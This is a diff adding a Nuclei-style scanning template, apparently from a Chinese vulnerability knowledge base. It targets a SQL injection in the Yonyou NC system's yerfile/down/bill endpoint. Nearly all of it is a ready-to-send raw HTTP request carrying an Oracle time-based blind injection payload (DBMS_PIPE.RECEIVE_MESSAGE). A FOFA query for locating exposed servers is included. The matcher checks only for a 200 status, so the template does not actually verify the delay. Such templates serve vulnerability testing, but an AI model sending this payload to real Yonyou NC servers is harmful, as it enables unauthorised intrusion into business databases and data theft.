@@ -1,0 +1,32 @@
+id: poc-thmh824ui6ehls42
+info:
+  name: 用友NC系统接口yerfile_down bill存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/thmh824ui6ehls42'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: thmh824ui6ehls42
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'POST /portal/pt/yerfile/down/bill?pageId=login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, br
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: close
+
+
+    id=1''+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),6)--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
